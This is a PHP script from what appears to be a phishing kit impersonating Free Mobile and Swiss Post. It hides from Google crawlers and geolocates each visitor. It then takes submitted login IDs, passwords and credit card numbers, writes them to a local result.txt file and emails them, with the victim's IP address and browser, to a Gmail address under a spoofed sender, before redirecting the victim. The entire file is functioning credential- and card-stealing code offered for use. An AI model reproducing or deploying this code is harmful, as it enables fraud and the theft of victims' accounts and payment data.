<?php
$ip = getenv("REMOTE_ADDR");
session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS DZEB ||---------------------------------------------------//
include "./BOTS/antibots1.php";
include "./BOTS/antibots2.php";
include "./BOTS/antibots3.php";
include "./BOTS/antibots4.php";
include "./BOTS/antibots5.php";
include "./BOTS/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//

	$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
	$session    = substr(md5($random), 0, 14);
$RZ3 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$CNCD  = $RZ3->geoplugin_countryCode ; // Country
$STCD  = $RZ3->geoplugin_regionCode ; //  State
$message .= "------------------------** ID FREE  **---------------------\n";
$message .= "id              : ".$_POST['comid']."\n";
$message .= "pass            : ".$_POST['compw']."\n";
$message .= "************************************\n";
$message .= "id              : ".$_POST['comid2']."\n";
$message .= "pass            : ".$_POST['compw2']."\n";
$message .= "------------------------** Kim  FULL  **-------------------\n";

$fp = fopen('../result.txt', 'a');
fwrite($fp, $message);
fclose($fp);
$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");
$message .= "--------------------------** POST CC  **------------------------------\n";
$message .= "CCN             : ".$_POST['card1']."".$_POST['card2']."".$_POST['card3']."".$_POST['card4']."\n";
$message .= "--------------------------** Kim  CC  **------------------------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "Browser : ".$browser."\n";
$to = "biloudede13@gmail.com";
$subj = "POST CC|".$ip."\n";
$from = "From: CC <Logine@post.ch>";
mail($to, $subj, $message, $from);

@header("Location: freemobile/page.html");